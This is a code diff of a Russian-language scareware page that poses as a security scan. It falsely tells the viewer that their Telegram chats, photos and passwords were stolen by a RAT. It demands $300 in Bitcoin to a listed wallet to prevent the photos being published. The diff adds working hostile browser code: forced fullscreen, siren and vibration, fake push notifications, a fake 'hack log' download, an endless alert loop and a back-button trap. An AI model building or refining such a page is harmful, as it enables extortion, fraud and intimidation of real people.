@@ -6,27 +6,38 @@
     <title>SYSTEM_CRITICAL_FAILURE</title>
     <style>
         body { background-color: black; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; -webkit-user-select: none; user-select: none; }
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 14px; opacity: 0.3; z-index: 1; line-height: 1.2; word-break: break-all; }
-        .content { position: relative; z-index: 10; text-align: center; width: 95%; max-width: 800px; max-height: 98vh; overflow-y: auto; }
+        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 14px; opacity: 0.3; z-index: 1; line-height: 1.2; word-break: break-all; pointer-events: none; }
+        .content { position: relative; z-index: 10; text-align: center; width: 95%; max-width: 800px; overflow-y: auto; max-height: 95vh; padding: 10px; }
         
         #loading-screen { display: block; }
-        .progress-container { width: 100%; border: 1px solid #00ff00; height: 25px; margin: 15px 0; background: rgba(0,255,0,0.1); }
+        .progress-container { width: 100%; border: 1px solid #00ff00; height: 25px; margin: 20px 0; background: rgba(0,255,0,0.1); }
         #progress-bar { width: 0%; height: 100%; background: #00ff00; box-shadow: 0 0 15px #00ff00; }
-        #scan-details { font-size: 14px; color: #00ff00; height: 50px; text-shadow: 0 0 5px #00ff00; }
+        #scan-details { font-size: 15px; color: #00ff00; height: 60px; text-shadow: 0 0 5px #00ff00; }
 
-        #main-alert { display: none; padding-bottom: 20px; }
-        .devil-img { width: 250px; filter: drop-shadow(0 0 20px red); animation: glitch 0.2s infinite; }
+        #main-alert { display: none; }
+        .devil-img { width: 90%; max-width: 450px; filter: drop-shadow(0 0 30px red); animation: glitch 0.2s infinite; margin-bottom: 10px; }
+        
         @keyframes glitch { 
-            0% { transform: translate(0); } 20% { transform: translate(-3px, 3px); } 40% { transform: translate(-3px, -3px); } 60% { transform: translate(3px, 3px); } 80% { transform: translate(3px, -3px); } 100% { transform: translate(0); }
+            0% { transform: translate(0); } 
+            20% { transform: translate(-3px, 3px); } 
+            40% { transform: translate(-3px, -3px); } 
+            60% { transform: translate(3px, 3px); } 
+            80% { transform: translate(3px, -3px); } 
+            100% { transform: translate(0); } 
         }
-        .alert-box { background: rgba(0, 0, 0, 0.95); border: 3px solid red; padding: 15px; color: #ff0000; box-shadow: 0 0 30px red; margin-top: 10px; text-align: left; font-size: 13px; }
+
+        .alert-box { background: rgba(0, 0, 0, 0.95); border: 3px solid red; padding: 20px; color: #ff0000; box-shadow: 0 0 30px red; font-size: 14px; text-align: left; }
         .blink { animation: blinker 0.6s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        .danger-btn { background: red; color: white; border: none; padding: 15px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; font-size: 14px; }
-        .btc-wallet { color: yellow; word-break: break-all; font-weight: bold; background: #222; padding: 3px; display: block; margin: 5px 0; }
         
-        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; }
-        .start-btn { padding: 20px; font-size: 18px; background: #00ff00; color: black; border: none; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #00ff00; }
+        .danger-btn { background: red; color: white; border: none; padding: 18px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; font-size: 16px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(255, 0, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
+
+        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: rgba(0,0,0,1); display: flex; justify-content: center; align-items: center; }
+        .start-btn { padding: 25px; font-size: 18px; background: #00ff00; color: black; border: none; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #00ff00; text-transform: uppercase; }
+        .btc-wallet { color: yellow; word-break: break-all; font-weight: bold; background: #222; padding: 5px; display: block; margin: 5px 0; border: 1px dashed yellow; }
+        h2 { margin: 0 0 10px 0; font-size: 20px; text-transform: uppercase; text-align: center; }
+        p { margin: 10px 0; line-height: 1.4; }
     </style>
 </head>
 <body onclick="initPermissions()">
@@ -39,27 +50,31 @@
 
     <div class="content">
         <div id="loading-screen">
-            <h1 class="blink" style="font-size: 20px;">INITIALIZING SECURITY SCAN...</h1>
+            <h1 class="blink" style="font-size: 24px;">SYSTEM SECURITY SCAN</h1>
             <div class="progress-container"><div id="progress-bar"></div></div>
-            <div id="scan-details">Ожидание разрешений системы...</div>
+            <div id="scan-details">Инициализация...</div>
         </div>
 
         <div id="main-alert">
-            <img src="Photoroom_20260211_192331.png" class="devil-img" alt="DEVIL">
+            <div style="text-align: center;">
+                <img src="Photoroom_20260211_192331.png" class="devil-img" alt="DEVIL">
+            </div>
             <div class="alert-box">
-                <h2 class="blink" style="text-align: center; margin: 5px 0;">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
+                <h2 class="blink">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
                 <p>Все данные Telegram, история браузера и личные фото были отправлены на удаленный сервер <strong>82.202.160.11</strong>.</p>
                 <p><strong>RAT STATUS: ACTIVE (SESSION_0x882)</strong></p>
-                <p>Ваше устройство полностью скомпрометировано. Через 168 часов данные будут дистанционно <strong>ЗАШИФРОВАНЫ</strong> и <strong>УДАЛЕНЫ</strong>.</p>
+                <p>Ваше устройство полностью скомпрометировано. Все личные данные (фотографии, видео, переписки и пароли) были успешно скопированы.</p>
+                <p>Через 168 часов данные будут <strong>ЗАШИФРОВАНЫ</strong> без возможности восстановления.</p>
                 <p>Для предотвращения публикации фото, необходимо оплатить <strong>$300</strong> в Bitcoin.</p>
                 
                 <p><strong>BTC Wallet:</strong>
                 <span class="btc-wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span></p>
 
-                <p class="blink" style="font-size: 16px; font-weight: 900; text-align: center; color: yellow;">STATUS: WAITING FOR PAYMENT...</p>
+                <p class="blink" style="font-size: 18px; font-weight: 900; text-align: center; color: yellow;">STATUS: WAITING FOR PAYMENT (167:59:42)...</p>
                 
                 <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
-                <p style="font-size: 10px; margin-top: 10px; color: #ccc; text-align: center;">Внимание: закрытие страницы приведет к публикации данных.</p>
+                
+                <p style="font-size: 11px; margin-top: 10px; color: #ccc; text-align: center;">Внимание: закрытие страницы приведет к немедленной публикации данных.</p>
             </div>
         </div>
     </div>
@@ -72,56 +87,98 @@
         const matrix = document.getElementById('matrix');
         const siren = document.getElementById('siren');
 
+        // ЗАПУСК ВСЕГО ПО КЛИКУ
         function initPermissions() {
             if (isStarted) return;
             isStarted = true;
             document.getElementById('overlay').style.display = 'none';
-            if (Notification.permission !== 'granted') Notification.requestPermission();
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(()=>{});
             
-            siren.play().catch(()=>{});
+            // Запрос уведомлений
+            if ("Notification" in window) {
+                Notification.requestPermission();
+            }
+            
+            // Фуллскрин
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => console.log(e));
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            }
+
+            siren.play().catch(e => console.log("Sound blocked"));
             startMatrix();
             startLoading();
         }
 
         function startMatrix() {
             setInterval(() => {
-                matrix.innerHTML += Math.random().toString(36).substring(2, 6) + " ";
-                if(matrix.innerHTML.length > 2000) matrix.innerHTML = "";
+                matrix.innerHTML += Math.random().toString(36).substring(2, 8) + " ";
+                if(matrix.innerHTML.length > 2500) matrix.innerHTML = "";
             }, 50);
         }
 
         function startLoading() {
-            const steps = ["Обход защиты...", "Чтение Telegram...", "Доступ к камере: OK", "Выгрузка фото...", "Шифрование DCIM...", "Синхронизация..."];
+            const steps = [
+                "Обход защиты Redmi OS...",
+                "Запрос доступа к уведомлениям...",
+                "Чтение базы данных Telegram...",
+                "Выгрузка скрытых чатов...",
+                "Копирование кэша медиафайлов...",
+                "Доступ к фронтальной камере: OK",
+                "Захват паролей Google Chrome...",
+                "Шифрование папок DCIM...",
+                "Синхронизация с RAT_SERVER...",
+                "Финальный дамп системы..."
+            ];
+
             const timer = setInterval(() => {
                 prg += 1;
                 document.getElementById('progress-bar').style.width = prg + "%";
-                document.getElementById('scan-details').innerText = steps[Math.floor(prg / 17)] || "Завершение...";
+                document.getElementById('scan-details').innerText = steps[Math.floor(prg / 10.1)] || "Завершение...";
+
                 if(prg >= 100) {
                     clearInterval(timer);
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('main-alert').style.display = 'block';
-                    if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
+                    if(navigator.vibrate) navigator.vibrate([1000, 200, 1000]);
                 }
-            }, 60); // Скорость полоски (6 секунд)
+            }, 80); // Полоска пройдет за 8 секунд
         }
 
+        function sendFakePush(title, message, delay) {
+            setTimeout(() => {
+                if (Notification.permission === 'granted') {
+                    new Notification(title, { body: message });
+                }
+            }, delay);
+        }
+
+        // ТО САМОЕ СКАЧИВАНИЕ И АЛЕРТЫ
         function scareMore() {
-            const blob = new Blob(["RAT_STATUS: WORKING\nTARGET: FULL_DUMP\nREMOTE_IP: 82.202.160.11"], {type: 'text/plain'});
+            // 1. Скачиваем "лог" взлома
+            const blob = new Blob(["RAT_STATUS: WORKING\nTARGET: TELEGRAM_FULL_DUMP\nREMOTE_IP: 82.202.160.11\nCAMERA_ACCESS: ENABLED"], {type: 'text/plain'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
-            a.download = "RAT_SYSTEM_LOG.txt";
+            a.download = "RAT_SYSTEM_LOG_CRITICAL.txt";
             a.click();
 
-            alert("ОШИБКА ДЕАКТИВАЦИИ: Код доступа отклонен. Запущена процедура самосохранения RAT.");
+            // 2. Фейковые пуши (если разрешила)
+            sendFakePush("[SYSTEM]: RAT_ACTIVE", "Выгрузка Telegram завершена.", 2000);
+            sendFakePush("ALARM", "Попытка деактивации привела к сбросу настроек.", 5000);
+
+            // 3. Бесконечные алерты
+            alert("ОШИБКА ДЕАКТИВАЦИИ: Код доступа отклонен.");
+            alert("Запущена процедура самосохранения RAT.");
             
             setTimeout(() => {
                 while(true) {
                     alert("CRITICAL ERROR: SYSTEM_OVERRIDE_BY_RAT");
+                    alert("ATTEMPT TO CLOSE BLOCKED");
                 }
             }, 1000);
         }
 
+        // Блокировка кнопки Назад
         history.pushState(null, null, location.href);
         window.onpopstate = function () { history.go(1); };
     </script>
